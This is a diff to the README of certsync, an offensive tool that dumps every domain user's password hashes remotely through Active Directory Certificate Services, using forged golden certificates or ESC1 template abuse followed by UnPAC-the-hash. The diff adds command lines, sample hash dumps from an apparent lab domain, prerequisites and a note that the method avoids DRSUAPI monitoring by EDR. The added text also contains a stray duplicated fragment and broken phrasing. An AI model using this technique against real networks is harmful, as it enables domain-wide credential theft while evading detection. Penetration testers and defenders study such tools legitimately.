@@ -1,6 +1,14 @@
 # certsync
 
-`certsync` is a new technique in order to dump NTDS remotely, but this time **without DRSUAPI**: it uses [golden certificate](https://www.thehacker.recipes/ad/persistence/ad-cs/golden-certificate) and [UnPAC the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash).
+`certsync` is a new way of users hash remotely, **without using DRSUAPI**. It offers two ways to do so:
++ Using [golden certificate](https://www.thehacker.recipes/ad/persistence/ad-cs/golden-certificate) and [UnPAC the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash).
++ Using [esc1]() and [UnPAC the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash) with an appropriate template (`ENROLLEE_SUPPLIES_SUBJECT` flag). As a CA Admin, several certificate templates should work, `SubCA` is used by default. 
+`certsync` is a new technique in order to dump 
+
+Contrary to what we may think, the attack is not at all slower.
+
+## Golden certificate
+
 It works in several steps:
 
 1. Dump user list, CA informations and CRL from LDAP
@@ -9,7 +17,7 @@ It works in several steps:
 4. UnPAC the hash for every user in order to get nt and lm hashes
 
 ```text
-$ certsync -u khal.drogo -p 'horse' -d essos.local -dc-ip 192.168.56.12 -ns 192.168.56.12
+$ certsync golden -u khal.drogo -p 'horse' -d essos.local -dc-ip 192.168.56.12 -ns 192.168.56.12
 [*] Collecting userlist, CA info and CRL on LDAP
 [*] Found 13 users in LDAP
 [*] Found CA ESSOS-CA on braavos.essos.local(192.168.56.23)
@@ -28,7 +36,31 @@ ESSOS.LOCAL/vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c
 ESSOS.LOCAL/Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
 ```
 
-Contrary to what we may think, the attack is not at all slower.
+## Certificate requests method
+
+It works in several steps:
+
+1. Dump user list
+2. Request a certificate with user specified as subject of the certificate
+3. UnPAC the hash for every user in order to get nt and lm hashes
+
+```text
+$ certsync esc1 -u khal.drogo -p 'horse' -d essos.local -dc-ip 192.168.56.12 -ns 192.168.56.12
+[*] Collecting userlist, CA info and CRL on LDAP
+[*] Found 13 users in LDAP
+[*] Getting users certificate using 'SubCA' template
+[*] PKINIT + UnPAC the hashes
+ESSOS.LOCAL/BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:08083254c2fd4079e273c6c783abfbb7:::
+ESSOS.LOCAL/MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:b79758e15b7870d28ad0769dfc784ca4:::
+ESSOS.LOCAL/sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
+ESSOS.LOCAL/jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
+ESSOS.LOCAL/khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
+ESSOS.LOCAL/viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
+ESSOS.LOCAL/daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
+ESSOS.LOCAL/SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:b63b6ef2caab52ffcb26b3870dc0c4db:::
+ESSOS.LOCAL/vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+ESSOS.LOCAL/Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
+```
 
 ## Table of Contents
 
@@ -88,6 +120,7 @@ CA options:
   -ca-pfx pfx/p12 file name
                         Path to CA certificate. If used, will skip backup of CA certificate and private key
   -ca-ip ip address     IP Address of the certificate authority. If omitted it will use the domainpart (FQDN) specified in LDAP
+  -template-name SubCA  (ESC1 only) Template to use for requests (Default = SubCA)
 
 authentication options:
   -d domain.local, -domain domain.local
@@ -128,11 +161,12 @@ DSRUAPI is more and more monitored and sometimes retricted by EDR solutions. Mor
 This attack needs:
 - A configured Entreprise CA on an ADCS server in the domain,
 - PKINIT working,
-- An domain account which is local administrator on the ADCS server, or an export of the CA certificate and private key.
+- For `golden` method: An domain account which is local administrator on the ADCS server, or an export of the CA certificate and private key.
+- For `esc1` method: A template with `ENROLEE_SUPPLIES_SUBJECT` flag that can be requested.
 
 ## Limitations
 
-Since we cannot PKINIT for users that are revoked, we cannot dump thier hashes.
+Since we cannot PKINIT for users that are revoked, we cannot dump their hashes.
 
 ## OPSEC
 
